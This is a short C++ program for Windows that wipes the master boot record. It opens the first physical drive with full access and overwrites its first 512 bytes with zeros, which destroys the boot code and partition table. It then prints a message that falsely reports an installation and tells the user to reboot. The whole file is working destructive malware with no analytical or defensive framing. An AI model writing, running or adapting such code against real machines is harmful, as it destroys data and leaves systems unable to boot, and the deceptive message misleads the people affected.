
#include <iostream>
#include <windows.h>
#include <lmcons.h>

using namespace std;
#define MBR_SIZE 512


int main ()
{
	DWORD write;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord =
		CreateFile("\\\\.\\PhysicalDrive0"
			, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		if(WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
		{

			
			std::cout << "Installed Please Reboot Computer" << std::endl;

		}
		else {
			std::cout << "Failed..." << std::endl;
			cin.get();
		}


		
	CloseHandle(MasterBootRecord);
}
